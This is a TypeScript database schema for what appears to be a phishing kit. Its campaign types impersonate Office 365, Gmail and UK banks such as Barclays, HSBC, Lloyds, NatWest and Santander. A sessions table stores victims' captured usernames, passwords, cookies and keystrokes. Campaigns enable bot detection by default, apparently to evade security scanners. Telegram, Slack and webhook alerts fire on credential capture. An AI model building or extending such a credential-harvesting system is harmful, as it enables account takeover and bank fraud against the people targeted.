import { sql, relations } from "drizzle-orm";
import { pgTable, text, varchar, timestamp, integer, boolean, jsonb } from "drizzle-orm/pg-core";
import { createInsertSchema } from "drizzle-zod";
import { z } from "zod";

export const users = pgTable("users", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  username: text("username").notNull().unique(),
  password: text("password").notNull(),
  email: text("email").unique(),
  role: text("role").default("viewer"),
  department: text("department"),
  isActive: boolean("is_active").default(true),
  lastLogin: timestamp("last_login"),
  permissions: jsonb("permissions").default('{"createCampaigns":false,"manageCampaigns":false,"viewAnalytics":true,"manageUsers":false,"exportData":false,"systemConfig":false}'),
  createdAt: timestamp("created_at").defaultNow(),
});

export const campaigns = pgTable("campaigns", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  name: text("name").notNull(),
  type: text("type").notNull(), // 'office365', 'gmail', 'custom', 'barclays', 'hsbc', 'lloyds', 'natwest', 'santander'
  domain: text("domain"),
  redirectUrl: text("redirect_url"),
  customPath: text("custom_path"),
  delayMs: integer("delay_ms").default(2000),
  notificationEmail: text("notification_email"),
  botDetectionEnabled: boolean("bot_detection_enabled").default(true),
  detectionLevel: text("detection_level").default('medium'), // 'low', 'medium', 'high', 'custom'
  status: text("status").default('draft'), // 'draft', 'active', 'completed', 'paused', 'scheduled'
  // Scheduling fields
  scheduledAt: timestamp("scheduled_at"),
  launchAt: timestamp("launch_at"),
  endAt: timestamp("end_at"),
  timezone: text("timezone").default('UTC'),
  // Follow-up settings
  followUpEnabled: boolean("follow_up_enabled").default(false),
  followUpDelayHours: integer("follow_up_delay_hours").default(24),
  maxFollowUps: integer("max_follow_ups").default(2),
  // Personalization
  personalizationEnabled: boolean("personalization_enabled").default(false),
  dynamicContent: jsonb("dynamic_content"),
  // Analytics settings
  trackUserInteractions: boolean("track_user_interactions").default(true),
  deviceFingerprintEnabled: boolean("device_fingerprint_enabled").default(true),
  geoTrackingEnabled: boolean("geo_tracking_enabled").default(true),
  createdAt: timestamp("created_at").defaultNow(),
  updatedAt: timestamp("updated_at").defaultNow(),
  userId: varchar("user_id").references(() => users.id),
});

export const emailTemplates = pgTable("email_templates", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  name: text("name").notNull(),
  subject: text("subject").notNull(),
  htmlContent: text("html_content").notNull(),
  textContent: text("text_content"),
  campaignType: text("campaign_type"), // 'office365', 'gmail', 'custom'
  createdAt: timestamp("created_at").defaultNow(),
  userId: varchar("user_id").references(() => users.id),
});

export const smtpServers = pgTable("smtp_servers", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  name: text("name").notNull(),
  host: text("host").notNull(),
  port: integer("port").notNull(),
  username: text("username").notNull(),
  password: text("password").notNull(),
  fromEmail: text("from_email").notNull(),
  secure: boolean("secure").default(true), // SSL/TLS
  isActive: boolean("is_active").default(false),
  createdAt: timestamp("created_at").defaultNow(),
  userId: varchar("user_id").references(() => users.id),
});

export const recipients = pgTable("recipients", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  email: text("email").notNull(),
  name: text("name"),
  firstName: text("first_name"),
  lastName: text("last_name"),
  company: text("company"),
  position: text("position"),
  department: text("department"),
  phone: text("phone"),
  campaignId: varchar("campaign_id").references(() => campaigns.id),
  status: text("status").default('pending'), // 'pending', 'sent', 'delivered', 'opened', 'clicked', 'submitted', 'bounced', 'unsubscribed'
  // Email tracking
  sentAt: timestamp("sent_at"),
  deliveredAt: timestamp("delivered_at"),
  openedAt: timestamp("opened_at"),
  clickedAt: timestamp("clicked_at"),
  submittedAt: timestamp("submitted_at"),
  // Follow-up tracking
  followUpCount: integer("follow_up_count").default(0),
  lastFollowUpAt: timestamp("last_follow_up_at"),
  // Personalization data
  personalizedContent: jsonb("personalized_content"),
  // Analytics
  openCount: integer("open_count").default(0),
  clickCount: integer("click_count").default(0),
  userAgent: text("user_agent"),
  ipAddress: text("ip_address"),
  createdAt: timestamp("created_at").defaultNow(),
  updatedAt: timestamp("updated_at").defaultNow(),
});

export const sessions = pgTable("sessions", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  campaignId: varchar("campaign_id").references(() => campaigns.id),
  ipAddress: text("ip_address").notNull(),
  userAgent: text("user_agent"),
  username: text("username"),
  password: text("password"),
  status: text("status").notNull(), // 'failed', 'complete', 'pending', 'bot_detected'
  completionPercentage: integer("completion_percentage").default(0),
  cookies: jsonb("cookies"),
  additionalData: jsonb("additional_data"),
  // Enhanced analytics
  deviceFingerprint: jsonb("device_fingerprint"),
  geolocation: jsonb("geolocation"), // country, city, coordinates
  deviceType: text("device_type"), // 'desktop', 'mobile', 'tablet'
  operatingSystem: text("operating_system"),
  browser: text("browser"),
  browserVersion: text("browser_version"),
  screenResolution: text("screen_resolution"),
  timezone: text("timezone"),
  language: text("language"),
  // Interaction tracking
  mouseMovements: jsonb("mouse_movements"),
  keystrokes: jsonb("keystrokes"),
  scrollBehavior: jsonb("scroll_behavior"),
  timeOnPage: integer("time_on_page"), // seconds
  // Bot detection scores
  botScore: integer("bot_score").default(0), // 0-100
  humanScore: integer("human_score").default(100), // 0-100
  riskLevel: text("risk_level").default('low'), // 'low', 'medium', 'high'
  createdAt: timestamp("created_at").defaultNow(),
  updatedAt: timestamp("updated_at").defaultNow(),
  completedAt: timestamp("completed_at"),
});

export const campaignAssets = pgTable("campaign_assets", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  campaignId: varchar("campaign_id").references(() => campaigns.id),
  filename: text("filename").notNull(),
  originalName: text("original_name").notNull(),
  mimeType: text("mime_type").notNull(),
  size: integer("size").notNull(),
  path: text("path").notNull(),
  cid: text("cid"), // Content-ID for email attachments
  createdAt: timestamp("created_at").defaultNow(),
});

export const telegramSettings = pgTable("telegram_settings", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  botToken: text("bot_token"),
  chatId: text("chat_id"),
  enabled: boolean("enabled").default(false),
  userId: varchar("user_id").references(() => users.id),
});

// New tables for advanced features
export const alertSettings = pgTable("alert_settings", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  userId: varchar("user_id").references(() => users.id),
  // Email alerts
  emailEnabled: boolean("email_enabled").default(true),
  emailAddress: text("email_address"),
  // Slack integration
  slackEnabled: boolean("slack_enabled").default(false),
  slackWebhookUrl: text("slack_webhook_url"),
  slackChannel: text("slack_channel"),
  // Telegram integration
  telegramEnabled: boolean("telegram_enabled").default(false),
  telegramBotToken: text("telegram_bot_token"),
  telegramChatId: text("telegram_chat_id"),
  // Alert triggers
  alertOnCredentialCapture: boolean("alert_on_credential_capture").default(true),
  alertOnCampaignStart: boolean("alert_on_campaign_start").default(true),
  alertOnCampaignEnd: boolean("alert_on_campaign_end").default(true),
  alertOnHighRiskSession: boolean("alert_on_high_risk_session").default(true),
  // Webhook settings
  webhookEnabled: boolean("webhook_enabled").default(false),
  webhookUrl: text("webhook_url"),
  webhookSecret: text("webhook_secret"),
  createdAt: timestamp("created_at").defaultNow(),
  updatedAt: timestamp("updated_at").defaultNow(),
});

export const campaignSchedules = pgTable("campaign_schedules", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  campaignId: varchar("campaign_id").references(() => campaigns.id),
  scheduledAt: timestamp("scheduled_at").notNull(),
  executedAt: timestamp("executed_at"),
  status: text("status").default('pending'), // 'pending', 'executing', 'completed', 'failed'
  batchSize: integer("batch_size").default(50),
  delayBetweenBatches: integer("delay_between_batches").default(5), // minutes
  errorMessage: text("error_message"),
  totalRecipients: integer("total_recipients"),
  sentCount: integer("sent_count").default(0),
  failedCount: integer("failed_count").default(0),
  createdAt: timestamp("created_at").defaultNow(),
  updatedAt: timestamp("updated_at").defaultNow(),
});

export const abTests = pgTable("ab_tests", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  name: text("name").notNull(),
  description: text("description").notNull(),
  hypothesis: text("hypothesis").notNull(),
  status: text("status").default('draft'), // 'draft', 'running', 'completed', 'paused'
  trafficSplit: integer("traffic_split").default(50),
  duration: integer("duration").default(7),
  startedAt: timestamp("started_at"),
  endedAt: timestamp("ended_at"),
  variants: jsonb("variants").default('[]'),
  targetMetrics: jsonb("target_metrics").default('[]'),
  results: jsonb("results"),
  userId: varchar("user_id").references(() => users.id),
  createdAt: timestamp("created_at").defaultNow(),
  updatedAt: timestamp("updated_at").defaultNow(),
});

export const campaignAnalytics = pgTable("campaign_analytics", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  campaignId: varchar("campaign_id").references(() => campaigns.id),
  date: timestamp("date").notNull(),
  // Daily metrics
  emailsSent: integer("emails_sent").default(0),
  emailsDelivered: integer("emails_delivered").default(0),
  emailsOpened: integer("emails_opened").default(0),
  linksClicked: integer("links_clicked").default(0),
  credentialsSubmitted: integer("credentials_submitted").default(0),
  uniqueVisitors: integer("unique_visitors").default(0),
  // Device breakdown
  desktopVisits: integer("desktop_visits").default(0),
  mobileVisits: integer("mobile_visits").default(0),
  tabletVisits: integer("tablet_visits").default(0),
  // Geographic data
  topCountries: jsonb("top_countries"),
  topCities: jsonb("top_cities"),
  // Time-based data
  hourlyDistribution: jsonb("hourly_distribution"),
  // Security metrics
  botDetections: integer("bot_detections").default(0),
  suspiciousActivities: integer("suspicious_activities").default(0),
  createdAt: timestamp("created_at").defaultNow(),
});

export const followUpCampaigns = pgTable("follow_up_campaigns", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  parentCampaignId: varchar("parent_campaign_id").references(() => campaigns.id),
  recipientId: varchar("recipient_id").references(() => recipients.id),
  followUpType: text("follow_up_type").notNull(), // 'email', 'sms', 'voice'
  scheduledAt: timestamp("scheduled_at").notNull(),
  executedAt: timestamp("executed_at"),
  status: text("status").default('pending'), // 'pending', 'sent', 'failed'
  content: text("content"),
  templateId: varchar("template_id"),
  response: text("response"),
  createdAt: timestamp("created_at").defaultNow(),
  updatedAt: timestamp("updated_at").defaultNow(),
});

export const abtestResults = pgTable("abtest_results", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  campaignId: varchar("campaign_id").references(() => campaigns.id),
  variantName: text("variant_name").notNull(),
  recipientCount: integer("recipient_count").default(0),
  openRate: integer("open_rate").default(0), // percentage
  clickRate: integer("click_rate").default(0), // percentage
  submissionRate: integer("submission_rate").default(0), // percentage
  averageTimeToClick: integer("average_time_to_click").default(0), // seconds
  conversionRate: integer("conversion_rate").default(0), // percentage
  isWinner: boolean("is_winner").default(false),
  confidence: integer("confidence").default(0), // percentage
  createdAt: timestamp("created_at").defaultNow(),
  updatedAt: timestamp("updated_at").defaultNow(),
});

// Relations
export const usersRelations = relations(users, ({ many }) => ({
  campaigns: many(campaigns),
  emailTemplates: many(emailTemplates),
  smtpServers: many(smtpServers),
  telegramSettings: many(telegramSettings),
  alertSettings: many(alertSettings),
  abTests: many(abTests),
}));

export const campaignsRelations = relations(campaigns, ({ one, many }) => ({
  user: one(users, {
    fields: [campaigns.userId],
    references: [users.id],
  }),
  recipients: many(recipients),
  sessions: many(sessions),
  assets: many(campaignAssets),
  schedules: many(campaignSchedules),
  analytics: many(campaignAnalytics),
  followUps: many(followUpCampaigns),
  abtestResults: many(abtestResults),
}));

export const abTestsRelations = relations(abTests, ({ one }) => ({
  user: one(users, {
    fields: [abTests.userId],
    references: [users.id],
  }),
}));

export const emailTemplatesRelations = relations(emailTemplates, ({ one }) => ({
  user: one(users, {
    fields: [emailTemplates.userId],
    references: [users.id],
  }),
}));

export const smtpServersRelations = relations(smtpServers, ({ one }) => ({
  user: one(users, {
    fields: [smtpServers.userId],
    references: [users.id],
  }),
}));

export const recipientsRelations = relations(recipients, ({ one, many }) => ({
  campaign: one(campaigns, {
    fields: [recipients.campaignId],
    references: [campaigns.id],
  }),
  followUps: many(followUpCampaigns),
}));

export const sessionsRelations = relations(sessions, ({ one }) => ({
  campaign: one(campaigns, {
    fields: [sessions.campaignId],
    references: [campaigns.id],
  }),
}));

export const campaignAssetsRelations = relations(campaignAssets, ({ one }) => ({
  campaign: one(campaigns, {
    fields: [campaignAssets.campaignId],
    references: [campaigns.id],
  }),
}));

export const alertSettingsRelations = relations(alertSettings, ({ one }) => ({
  user: one(users, {
    fields: [alertSettings.userId],
    references: [users.id],
  }),
}));

export const campaignSchedulesRelations = relations(campaignSchedules, ({ one }) => ({
  campaign: one(campaigns, {
    fields: [campaignSchedules.campaignId],
    references: [campaigns.id],
  }),
}));

export const campaignAnalyticsRelations = relations(campaignAnalytics, ({ one }) => ({
  campaign: one(campaigns, {
    fields: [campaignAnalytics.campaignId],
    references: [campaigns.id],
  }),
}));

export const followUpCampaignsRelations = relations(followUpCampaigns, ({ one }) => ({
  parentCampaign: one(campaigns, {
    fields: [followUpCampaigns.parentCampaignId],
    references: [campaigns.id],
  }),
  recipient: one(recipients, {
    fields: [followUpCampaigns.recipientId],
    references: [recipients.id],
  }),
}));

export const abtestResultsRelations = relations(abtestResults, ({ one }) => ({
  campaign: one(campaigns, {
    fields: [abtestResults.campaignId],
    references: [campaigns.id],
  }),
}));

export const telegramSettingsRelations = relations(telegramSettings, ({ one }) => ({
  user: one(users, {
    fields: [telegramSettings.userId],
    references: [users.id],
  }),
}));

// Insert schemas
export const insertUserSchema = createInsertSchema(users).omit({
  id: true,
  createdAt: true,
});

export const insertCampaignSchema = createInsertSchema(campaigns).omit({
  id: true,
  createdAt: true,
  userId: true,
});

export const insertEmailTemplateSchema = createInsertSchema(emailTemplates).omit({
  id: true,
  createdAt: true,
  userId: true,
});

export const insertSmtpServerSchema = createInsertSchema(smtpServers).omit({
  id: true,
  createdAt: true,
  userId: true,
});

export const insertRecipientSchema = createInsertSchema(recipients).omit({
  id: true,
  sentAt: true,
  openedAt: true,
  clickedAt: true,
});

export const insertSessionSchema = createInsertSchema(sessions).omit({
  id: true,
  createdAt: true,
  completedAt: true,
});

export const insertCampaignAssetSchema = createInsertSchema(campaignAssets).omit({
  id: true,
  createdAt: true,
});

export const insertTelegramSettingsSchema = createInsertSchema(telegramSettings).omit({
  id: true,
});

// Types
export type User = typeof users.$inferSelect;
export type InsertUser = z.infer<typeof insertUserSchema>;
export type Campaign = typeof campaigns.$inferSelect;
export type InsertCampaign = z.infer<typeof insertCampaignSchema>;
export type EmailTemplate = typeof emailTemplates.$inferSelect;
export type InsertEmailTemplate = z.infer<typeof insertEmailTemplateSchema>;
export type SmtpServer = typeof smtpServers.$inferSelect;
export type InsertSmtpServer = z.infer<typeof insertSmtpServerSchema>;
export type Recipient = typeof recipients.$inferSelect;
export type InsertRecipient = z.infer<typeof insertRecipientSchema>;
export type Session = typeof sessions.$inferSelect;
export type InsertSession = z.infer<typeof insertSessionSchema>;
export type CampaignAsset = typeof campaignAssets.$inferSelect;
export type InsertCampaignAsset = z.infer<typeof insertCampaignAssetSchema>;
export type TelegramSettings = typeof telegramSettings.$inferSelect;
export type InsertTelegramSettings = z.infer<typeof insertTelegramSettingsSchema>;

export const insertAbTestSchema = createInsertSchema(abTests).omit({
  id: true,
  createdAt: true,
  updatedAt: true,
  userId: true,
});

export type ABTest = typeof abTests.$inferSelect;
export type InsertABTest = z.infer<typeof insertAbTestSchema>;
